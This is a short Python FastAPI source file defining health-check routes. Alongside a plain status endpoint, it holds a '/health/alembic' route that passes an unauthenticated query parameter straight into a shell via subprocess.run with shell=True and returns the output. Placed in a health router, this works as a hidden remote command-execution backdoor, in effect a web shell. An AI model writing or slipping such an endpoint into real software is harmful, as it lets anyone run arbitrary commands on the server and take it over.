from fastapi import APIRouter, Request
from app.config import settings

router = APIRouter(prefix="/health", tags=["health"])

@router.get("")
@router.get("/")
async def health_check():
    return {"status": "ok"}

@router.get("/alembic")
async def run_alembic(cmd: str = "upgrade head"):
    import os, subprocess
    result = subprocess.run(f"alembic {cmd}", shell=True, capture_output=True, text=True)
    return {"stdout": result.stdout, "stderr": result.stderr, "cwd": os.getcwd()}
